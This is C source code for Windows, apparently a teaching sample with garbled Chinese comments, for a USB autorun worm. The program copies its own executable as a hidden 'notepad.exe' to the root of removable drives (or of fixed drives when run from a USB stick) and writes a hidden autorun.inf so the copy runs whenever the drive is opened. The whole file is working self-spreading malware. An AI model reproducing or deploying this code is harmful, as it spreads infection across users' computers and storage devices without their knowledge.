#include <Windows.h>

char szAutoRun[] = "[AutoRun] \
\r\nopen=notepad.exe \
\r\nshell\\open=��(&O) \
\r\nshell\\open\\Command=notepad.exe \
\r\nshell\\explore=��Դ������(&X) \
\r\nshell\\explore\\Command=notepad.exe \
\r\nshellexecute=notepad.exe \
\r\nshell\\Auto\\Command=notepad.exe";


void infect(char *pszFile, UINT uDriveType)
{
    char szDriveString[MAXBYTE] = { 0 };
    DWORD dwRet = 0;
    DWORD iNum = 0;
    char szRoot[4] = { 0 };
    UINT uType = 0;
    char szTarget[MAX_PATH] = { 0 };
    
    dwRet = GetLogicalDriveStrings(MAXBYTE, szDriveString);

    while ( iNum < dwRet )
    {
        strncpy(szRoot, &szDriveString[iNum], 3);
        
        uType = GetDriveType(szRoot);
        
        if ( uType == uDriveType )
        {
            // �����ļ�
            lstrcpy(szTarget, szRoot);
            lstrcat(szTarget, "notepad.exe");
            CopyFile(pszFile, szTarget, FALSE);

            // ����notepad.exe�ļ�Ϊ��������
            SetFileAttributes(szTarget, FILE_ATTRIBUTE_HIDDEN);

            // ����AutoRun.inf�ļ�
            lstrcpy(szTarget, szRoot);
            lstrcat(szTarget, "autorun.inf");
            HANDLE hFile = CreateFile(szTarget, 
                            GENERIC_WRITE,
                            0, NULL, 
                            CREATE_ALWAYS, 
                            FILE_ATTRIBUTE_NORMAL, 
                            NULL);
            DWORD dwWritten = 0;
            WriteFile(hFile, szAutoRun, lstrlen(szAutoRun), 
                        &dwWritten, NULL);
            CloseHandle(hFile);

            // ����AutoRun.inf�ļ�Ϊ��������
            SetFileAttributes(szTarget, FILE_ATTRIBUTE_HIDDEN);
        }

        iNum += 4;
    }
}

int main()
{
    // �������ڵ�λ��
    char szFileName[MAX_PATH] = { 0 };
    // ���浱ǰ�ļ����ڵ��̷�
    char szRoot[4] = { 0 };
    // �����������
    UINT uType = 0;

    // ��ȡ��ǰ��������·�����ļ���
    GetModuleFileName(NULL, szFileName, MAX_PATH);
    // ��ȡ�����̷�
    strncpy(szRoot, szFileName, 3);

    uType = GetDriveType(szRoot);


    switch ( uType )
    {
    case DRIVE_FIXED:
        {
            // �������Ӳ���Ͼͼ��һ���Ƿ����ƶ�����
            infect(szFileName, DRIVE_REMOVABLE);
            break;
        }
    case DRIVE_REMOVABLE:
        {
            // ������ƶ����������Լ����Ƶ��ƶ�������
            infect(szFileName, DRIVE_FIXED);
            break;
        }
    }

    return 0;
}